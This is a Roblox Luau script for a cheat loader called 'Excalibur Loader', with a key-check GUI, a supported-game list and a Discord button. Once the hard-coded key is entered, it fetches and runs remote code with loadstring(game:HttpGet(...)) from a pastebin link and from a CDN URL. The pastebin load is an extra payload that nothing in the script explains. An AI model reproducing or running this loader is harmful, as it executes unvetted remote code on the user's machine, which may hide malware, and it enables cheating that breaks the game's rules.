local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local SCRIPT_URL = "https://cdn.authguard.org/virtual-file/e7bb8030f7ab48af994323e82089b6f9"
local UNIQUE_KEY = "EXS_9b7d9404da2449da8379d217f41a06a2"

local SupportedGames = {
    [10449761463] = true,
    [12360882630] = true,
}
local enteredKey = ""
local currentGameName = "Loading..."
local success, result = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId).Name
end)
if success then
    currentGameName = result
end
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ExcaliburLoader"
ScreenGui.DisplayOrder = 9999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")
local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Size = UDim2.new(0, 300, 0, 260) 
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -130)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui
local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 8)
Corner.Parent = MainFrame
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, -20, 0, 24)
Title.Position = UDim2.new(0.5, 0, 0, 12)
Title.AnchorPoint = Vector2.new(0.5, 0)
Title.BackgroundTransparency = 1
Title.Text = "EXCALIBUR LOADER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold
Title.ZIndex = 2
Title.Parent = MainFrame
local GameInfo = Instance.new("TextLabel")
GameInfo.Name = "GameInfo"
GameInfo.Size = UDim2.new(1, -20, 0, 20)
GameInfo.Position = UDim2.new(0.5, 0, 0, 36)
GameInfo.AnchorPoint = Vector2.new(0.5, 0)
GameInfo.BackgroundTransparency = 1
GameInfo.Text = "Current Game: "..currentGameName
GameInfo.TextColor3 = Color3.fromRGB(180, 180, 180)
GameInfo.TextSize = 12
GameInfo.Font = Enum.Font.Gotham
GameInfo.ZIndex = 2
GameInfo.Parent = MainFrame
local SupportStatus = Instance.new("TextLabel")
SupportStatus.Name = "SupportStatus"
SupportStatus.Size = UDim2.new(1, -20, 0, 20)
SupportStatus.Position = UDim2.new(0.5, 0, 0, 54)
SupportStatus.AnchorPoint = Vector2.new(0.5, 0)
SupportStatus.BackgroundTransparency = 1
SupportStatus.Text = SupportedGames[game.PlaceId] and "✅ Supported Game" or "⚠️ Not Supported"
SupportStatus.TextColor3 = SupportedGames[game.PlaceId] and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 150, 50)
SupportStatus.TextSize = 12
SupportStatus.Font = Enum.Font.GothamMedium
SupportStatus.ZIndex = 2
SupportStatus.Parent = MainFrame
local KeyInput = Instance.new("TextBox")
KeyInput.Name = "KeyInput"
KeyInput.Size = UDim2.new(0.85, 0, 0, 32)
KeyInput.Position = UDim2.new(0.5, 0, 0, 90)
KeyInput.AnchorPoint = Vector2.new(0.5, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
KeyInput.PlaceholderText = "Enter key..."
KeyInput.Text = ""
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.TextSize = 14
KeyInput.Font = Enum.Font.Gotham
KeyInput.ZIndex = 2
KeyInput.Parent = MainFrame
local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 6)
InputCorner.Parent = KeyInput
local CheckButton = Instance.new("TextButton")
CheckButton.Name = "CheckButton"
CheckButton.Size = UDim2.new(0.8, 0, 0, 28)
CheckButton.Position = UDim2.new(0.5, 0, 0, 135)
CheckButton.AnchorPoint = Vector2.new(0.5, 0)
CheckButton.BackgroundColor3 = Color3.fromRGB(50, 120, 220)
CheckButton.Text = "VERIFY KEY"
CheckButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckButton.TextSize = 14
CheckButton.Font = Enum.Font.GothamBold
CheckButton.ZIndex = 2
CheckButton.Parent = MainFrame
local DiscordButton = Instance.new("TextButton")
DiscordButton.Name = "DiscordButton"
DiscordButton.Size = UDim2.new(0.8, 0, 0, 28)
DiscordButton.Position = UDim2.new(0.5, 0, 0, 173)
DiscordButton.AnchorPoint = Vector2.new(0.5, 0)
DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
DiscordButton.Text = "DISCORD"
DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.TextSize = 14
DiscordButton.Font = Enum.Font.GothamBold
DiscordButton.ZIndex = 2
DiscordButton.Parent = MainFrame
KeyInput:GetPropertyChangedSignal("Text"):Connect(function()
    enteredKey = KeyInput.Text
end)
CheckButton.MouseButton1Click:Connect(function()
    if enteredKey == UNIQUE_KEY then
        if SupportedGames[game.PlaceId] then
            loadstring(game:HttpGet("https://pastebin.com/raw/cRUTEdBH"))()
            loadstring(game:HttpGet(SCRIPT_URL))()
            ScreenGui:Destroy()
        else
            game.Players.LocalPlayer:Kick("⚠️ This game is not supported.")
        end
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Invalid Key",
            Text = "The key you entered is not valid.",
            Duration = 5
        })
    end
end)
DiscordButton.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/Vqt5U2fSNK")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Discord",
        Text = "Discord link copied to clipboard!",
        Duration = 3
    })
end)
local dragging, dragStart, startPos
Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
MainFrame.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 300, 0, 260)
}):Play()
